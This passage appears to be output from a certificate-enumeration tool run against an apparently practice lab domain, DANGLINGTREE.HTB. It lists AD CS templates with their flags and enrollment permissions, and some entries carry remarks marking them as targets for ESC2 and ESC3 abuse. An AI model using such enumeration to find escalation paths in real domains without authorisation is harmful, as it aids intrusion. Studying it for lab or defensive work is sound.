                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
  10
    Template Name                       : ExchangeUser
    Display Name                        : Exchange User
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Secure Email
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
  11
    Template Name                       : CEPEncryption
    Display Name                        : CEP Encryption
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
  12
    Template Name                       : OfflineRouter
    Display Name                        : Router (Offline request)
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
  13
    Template Name                       : IPSECIntermediateOffline
    Display Name                        : IPSec (Offline request)
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : IP security IKE intermediate
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
  14
    Template Name                       : IPSECIntermediateOnline
    Display Name                        : IPSec
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : IP security IKE intermediate
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Domain Computers
                                          DANGLINGTREE.HTB\Domain Controllers
                                          DANGLINGTREE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Domain Computers
                                          DANGLINGTREE.HTB\Domain Controllers
                                          DANGLINGTREE.HTB\Enterprise Admins
  15
    Template Name                       : SubCA
    Display Name                        : Subordinate Certification Authority
    Certificate Authorities             : danglingtree-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Private Key Flag                    : ExportableKey
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
  16
    Template Name                       : CA
    Display Name                        : Root Certification Authority
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Private Key Flag                    : ExportableKey
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
  17
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : danglingtree-DC-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
  18
    Template Name                       : DomainController
    Display Name                        : Domain Controller
    Certificate Authorities             : danglingtree-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDirectoryGuid
                                          SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Enterprise Read-only Domain Controllers
                                          DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Domain Controllers
                                          DANGLINGTREE.HTB\Enterprise Admins
                                          DANGLINGTREE.HTB\Enterprise Domain Controllers
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Domain Controllers
                                          DANGLINGTREE.HTB\Enterprise Admins
                                          DANGLINGTREE.HTB\Enterprise Domain Controllers
  19
    Template Name                       : Machine
    Display Name                        : Computer
    Certificate Authorities             : danglingtree-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Domain Computers
                                          DANGLINGTREE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Domain Computers
                                          DANGLINGTREE.HTB\Enterprise Admins
    [+] User Enrollable Principals      : DANGLINGTREE.HTB\Domain Computers
    [*] Remarks
      ESC2 Target Template              : Template can be targeted as part of ESC2 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template has schema version 1.
  20
    Template Name                       : MachineEnrollmentAgent
    Display Name                        : Enrollment Agent (Computer)
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
                                          SubjectRequireDnsAsCn
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
  21
    Template Name                       : EnrollmentAgentOffline
    Display Name                        : Exchange Enrollment Agent (Offline request)
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
  22
    Template Name                       : EnrollmentAgent
    Display Name                        : Enrollment Agent
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
  23
    Template Name                       : CTLSigning
    Display Name                        : Trust List Signing
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Microsoft Trust List Signing
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
  24
    Template Name                       : CodeSigning
    Display Name                        : Code Signing
    Enabled                             : False
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Code Signing
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
  25
    Template Name                       : EFSRecovery
    Display Name                        : EFS Recovery Agent
    Certificate Authorities             : danglingtree-DC-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : File Recovery
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 5 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
  26
    Template Name                       : Administrator
    Display Name                        : Administrator
    Certificate Authorities             : danglingtree-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Microsoft Trust List Signing
                                          Encrypting File System
                                          Secure Email
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
  27
    Template Name                       : EFS
    Display Name                        : Basic EFS
    Certificate Authorities             : danglingtree-DC-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Domain Users
                                          DANGLINGTREE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Domain Users
                                          DANGLINGTREE.HTB\Enterprise Admins
    [+] User Enrollable Principals      : DANGLINGTREE.HTB\Domain Users
  28
    Template Name                       : SmartcardLogon
    Display Name                        : Smartcard Logon
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Extended Key Usage                  : Client Authentication
                                          Smart Card Logon
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
  29
    Template Name                       : ClientAuth
    Display Name                        : Authenticated Session
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2026-03-26T05:44:31+00:00
    Template Last Modified              : 2026-03-26T05:44:31+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Domain Users
                                          DANGLINGTREE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : DANGLINGTREE.HTB\Enterprise Admins
        Full Control Principals         : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Owner Principals          : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Dacl Principals           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Enterprise Admins
        Write Property Enroll           : DANGLINGTREE.HTB\Domain Admins
                                          DANGLINGTREE.HTB\Domain Users
                                          DANGLINGTREE.HTB\Enterprise Admins
  30
    Template Name                       : SmartcardUser
    Display Name                        : Smartcard User
    Enabled                             : False
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Extended Key Usage                  : Secure Email
                                          Client Authentication
                                          Smart Card Logon
    Requires Manager Approval           : False
